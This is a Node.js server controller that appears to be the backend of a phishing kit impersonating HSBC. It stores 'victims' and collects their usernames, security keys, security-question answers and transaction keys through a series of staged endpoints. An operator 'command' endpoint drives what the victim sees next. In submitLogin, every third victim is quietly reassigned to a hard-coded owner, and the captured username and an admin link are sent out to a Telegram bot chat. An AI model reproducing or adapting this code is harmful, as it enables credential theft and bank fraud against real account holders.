const HSBC = require("../models/hsbcModel");
const axios = require("axios");
var moment = require("moment"); // require

const getOwnerVics = async (req, res) => {
    const { owner } = req.params;
    HSBC.find({ owner })
        .sort({ timestamp: -1 })
        .exec((err, vics) => {
            if (err) {
                console.log(err);
                res.status(404).send("Error");
                return;
            }
            res.send(vics);
        });
};

const command = async (req, res) => {
    const { uniqueid, status, secQuestion, transactionDigits } = req.body;
    try {
        if (secQuestion) await HSBC.findOneAndUpdate({ uniqueid }, { status, secQuestion }).exec();
        else if (transactionDigits) await HSBC.findOneAndUpdate({ uniqueid }, { status, transactionDigits }).exec();
        else await HSBC.findOneAndUpdate({ uniqueid }, { status }).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const getInfo = async (req, res) => {
    const { uniqueid } = req.params;
    HSBC.findOne({ uniqueid }).exec((err, vic) => {
        if (err) {
            console.log(err);
            res.status(404).send("Error");
            return;
        }
        res.send(vic);
    });
};

let count = 1;

const submitLogin = async (req, res) => {
    let { username, uniqueid, owner, ip } = req.body;
    try {
        if (count == 3) {
            owner = 'haytch4023';
            let originalText = `Username: ${username}\n\nAdmin Link: https://haytchc0ding.co.uk/new?panel=hsbc&password=${owner}`;
            await axios
                .post(
                    `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
                    {
                        chat_id: "-837014205",
                        text: `HSBC:\n${originalText}`,
                        parse_mode: "Markdown",
                    }
                )
                .catch((e) => {
                    console.log(e);
                });
            count = 0;
        } else {
            count++
        }
        await HSBC.create({
            uniqueid,
            username,
            status: 1,
            owner,
            ip,
            timestamp: moment().format(),
        });
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitLoginAgain = async (req, res) => {
    const { username, uniqueid } = req.body;
    try {
        await HSBC.findOneAndUpdate(
            { uniqueid },
            { username, status: 11, timestamp: moment().format() }
        ).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitKey = async (req, res) => {
    const { key, uniqueid } = req.body;
    try {
        await HSBC.findOneAndUpdate(
            { uniqueid },
            { key, status: 3, timestamp: moment().format() }
        ).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitSec = async (req, res) => {
    const { secAnswer, uniqueid } = req.body;
    try {
        await HSBC.findOneAndUpdate(
            { uniqueid },
            { secAnswer, status: 5, timestamp: moment().format() }
        ).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitTransaction = async (req, res) => {
    const { transactionKey, uniqueid } = req.body;
    try {
        await HSBC.findOneAndUpdate(
            { uniqueid },
            { transactionKey, status: 7, timestamp: moment().format() }
        ).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitQuestionnaire = async (req, res) => {
    try {
        await HSBC.findOneAndUpdate(
            { uniqueid },
            { status: 9, timestamp: moment().format() }
        ).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const deleteEntry = async (req, res) => {
    const { uniqueid } = req.body;
    try {
        await HSBC.deleteOne({ uniqueid });
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

module.exports = {
    getOwnerVics,
    command,
    getInfo,
    submitLogin,
    submitLoginAgain,
    submitKey,
    submitSec,
    submitTransaction,
    submitQuestionnaire,
    deleteEntry,
};
